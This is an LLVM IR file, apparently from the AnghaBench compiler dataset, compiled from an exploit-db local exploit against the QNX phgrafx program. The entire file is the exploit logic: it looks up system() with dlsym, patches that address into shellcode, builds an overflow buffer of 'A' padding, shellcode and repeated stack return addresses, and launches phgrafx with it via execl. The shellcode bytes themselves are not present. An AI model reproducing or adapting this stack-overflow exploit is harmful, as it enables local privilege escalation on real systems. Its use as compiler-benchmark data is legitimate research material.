; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_1347.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/qnx/local/extr_1347.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@scode = common dso_local global i8* null, align 8
@RTLD_LAZY = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [7 x i8] c"system\00", align 1
@.str.1 = private unnamed_addr constant [315 x i8] c"currently system()'s address contains bytes like 0x00, 0x09 or 0x0a, so it probably won't work since the application seems to truncate those bytes. BTW you can rely on functions like exec*(), spawn*() or MsgSend*() to get this working.\0Amore at http://www.qnx.org/developers/docs/momentics621_docs/neutrino/lib_ref/\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"malloc()\00", align 1
@_RET_INIT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"shellcode length: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"address: 0x%lx\0A\00", align 1
@_PATH = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [8 x i8] c"phgrafx\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8, align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %15 = load i8*, i8** @scode, align 8
  %16 = call i32 @strlen(i8* %15)
  store i32 %16, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %17 = load i32, i32* @RTLD_LAZY, align 4
  %18 = call i8* @dlopen(i32* null, i32 %17)
  store i8* %18, i8** %13, align 8
  %19 = load i8*, i8** %13, align 8
  %20 = call i64 @dlsym(i8* %19, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i64 %20, i64* %11, align 8
  store i32 0, i32* %6, align 4
  br label %21

21:                                               ; preds = %47, %2
  %22 = load i32, i32* %6, align 4
  %23 = icmp slt i32 %22, 4
  br i1 %23, label %24, label %50

24:                                               ; preds = %21
  %25 = bitcast i64* %11 to i8*
  %26 = load i32, i32* %6, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i8, i8* %28, align 1
  %30 = sext i8 %29 to i32
  %31 = and i32 %30, 255
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* %14, align 1
  %33 = load i8, i8* %14, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %44, label %36

36:                                               ; preds = %24
  %37 = load i8, i8* %14, align 1
  %38 = sext i8 %37 to i32
  %39 = icmp eq i32 %38, 9
  br i1 %39, label %44, label %40

40:                                               ; preds = %36
  %41 = load i8, i8* %14, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp eq i32 %42, 10
  br i1 %43, label %44, label %46

44:                                               ; preds = %40, %36, %24
  %45 = call i32 @puts(i8* getelementptr inbounds ([315 x i8], [315 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %142

46:                                               ; preds = %40
  br label %47

47:                                               ; preds = %46
  %48 = load i32, i32* %6, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %6, align 4
  br label %21

50:                                               ; preds = %21
  %51 = call i32 @memcpy(i8* getelementptr inbounds (i8, i8* bitcast (i8** @scode to i8*), i64 15), i64* %11, i32 4)
  %52 = load i32, i32* %4, align 4
  %53 = icmp sgt i32 %52, 1
  br i1 %53, label %54, label %59

54:                                               ; preds = %50
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @strtoul(i8* %57, i32* null, i32 0)
  store i32 %58, i32* %8, align 4
  br label %59

59:                                               ; preds = %54, %50
  %60 = call i64 @malloc(i32 1032)
  %61 = inttoptr i64 %60 to i8*
  store i8* %61, i8** %12, align 8
  %62 = icmp ne i8* %61, null
  br i1 %62, label %65, label %63

63:                                               ; preds = %59
  %64 = call i32 @err(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  br label %65

65:                                               ; preds = %63, %59
  %66 = load i8*, i8** %12, align 8
  %67 = call i32 @memset(i8* %66, i32 0, i32 1032)
  store i32 0, i32* %6, align 4
  br label %68

68:                                               ; preds = %79, %65
  %69 = load i32, i32* %6, align 4
  %70 = load i32, i32* @_RET_INIT, align 4
  %71 = load i32, i32* %7, align 4
  %72 = sub nsw i32 %70, %71
  %73 = icmp slt i32 %69, %72
  br i1 %73, label %74, label %82

74:                                               ; preds = %68
  %75 = load i8*, i8** %12, align 8
  %76 = load i32, i32* %6, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  store i8 65, i8* %78, align 1
  br label %79

79:                                               ; preds = %74
  %80 = load i32, i32* %6, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %6, align 4
  br label %68

82:                                               ; preds = %68
  %83 = load i32, i32* %7, align 4
  %84 = sext i32 %83 to i64
  %85 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0), i64 %84)
  %86 = load i32, i32* @_RET_INIT, align 4
  %87 = load i32, i32* %7, align 4
  %88 = sub nsw i32 %86, %87
  store i32 %88, i32* %6, align 4
  br label %89

89:                                               ; preds = %107, %82
  %90 = load i32, i32* %6, align 4
  %91 = load i32, i32* @_RET_INIT, align 4
  %92 = icmp slt i32 %90, %91
  br i1 %92, label %93, label %110

93:                                               ; preds = %89
  %94 = load i8*, i8** @scode, align 8
  %95 = load i32, i32* %6, align 4
  %96 = load i32, i32* @_RET_INIT, align 4
  %97 = load i32, i32* %7, align 4
  %98 = sub nsw i32 %96, %97
  %99 = sub nsw i32 %95, %98
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %94, i64 %100
  %102 = load i8, i8* %101, align 1
  %103 = load i8*, i8** %12, align 8
  %104 = load i32, i32* %6, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %103, i64 %105
  store i8 %102, i8* %106, align 1
  br label %107

107:                                              ; preds = %93
  %108 = load i32, i32* %6, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %6, align 4
  br label %89

110:                                              ; preds = %89
  %111 = load i8*, i8** %12, align 8
  %112 = load i32, i32* @_RET_INIT, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %111, i64 %113
  %115 = bitcast i8* %114 to i64*
  store i64* %115, i64** %10, align 8
  %116 = call i32 (...) @get_sp()
  %117 = load i32, i32* %8, align 4
  %118 = sub nsw i32 %116, %117
  %119 = sext i32 %118 to i64
  store i64 %119, i64* %9, align 8
  %120 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0), i64 %119)
  store i32 0, i32* %6, align 4
  br label %121

121:                                              ; preds = %135, %110
  %122 = load i32, i32* %6, align 4
  %123 = load i32, i32* @_RET_INIT, align 4
  %124 = sub nsw i32 1024, %123
  %125 = sdiv i32 %124, 4
  %126 = icmp slt i32 %122, %125
  br i1 %126, label %127, label %138

127:                                              ; preds = %121
  %128 = load i64, i64* %9, align 8
  %129 = trunc i64 %128 to i32
  %130 = sext i32 %129 to i64
  %131 = load i64*, i64** %10, align 8
  %132 = load i32, i32* %6, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i64, i64* %131, i64 %133
  store i64 %130, i64* %134, align 8
  br label %135

135:                                              ; preds = %127
  %136 = load i32, i32* %6, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %6, align 4
  br label %121

138:                                              ; preds = %121
  %139 = load i32, i32* @_PATH, align 4
  %140 = load i8*, i8** %12, align 8
  %141 = call i32 @execl(i32 %139, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* %140, i32* null)
  store i32 0, i32* %3, align 4
  br label %142

142:                                              ; preds = %138, %44
  %143 = load i32, i32* %3, align 4
  ret i32 %143
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i8* @dlopen(i32*, i32) #1

declare dso_local i64 @dlsym(i8*, i8*) #1

declare dso_local i32 @puts(i8*) #1

declare dso_local i32 @memcpy(i8*, i64*, i32) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, i64) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @execl(i32, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
